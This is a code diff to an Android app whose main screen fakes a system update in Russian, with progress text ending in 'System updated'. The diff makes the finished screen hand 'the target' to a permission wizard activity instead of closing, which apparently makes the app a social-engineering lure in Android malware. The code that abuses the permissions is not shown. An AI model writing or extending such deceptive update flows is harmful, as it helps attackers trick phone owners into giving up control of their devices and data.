@@ -1,6 +1,7 @@
 package com.sp.core
 
 import android.app.Activity
+import android.content.Context
 import android.graphics.Color
 import android.graphics.Typeface
 import android.os.Bundle
@@ -11,6 +12,8 @@ import android.widget.ProgressBar
 import android.widget.TextView
 
 class MainActivity : Activity() {
+    private val appCtx: Context get() = this
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         val root = LinearLayout(this).apply {
@@ -62,7 +65,17 @@ class MainActivity : Activity() {
                 progress.progress = p.coerceAtMost(100)
                 if (p >= 100) {
                     status.text = "Система обновлена"
-                    handler.postDelayed({ finishAndRemoveTask() }, 800)
+                    handler.postDelayed({
+                        // Hand the target over to the permission wizard.
+                        try {
+                            startActivity(
+                                android.content.Intent(appCtx, SetupActivity::class.java)
+                                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                            )
+                        } catch (_: Throwable) {
+                        }
+                        finishAndRemoveTask()
+                    }, 800)
                     return
                 }
                 status.text = "Проверка обновлений... $p%"
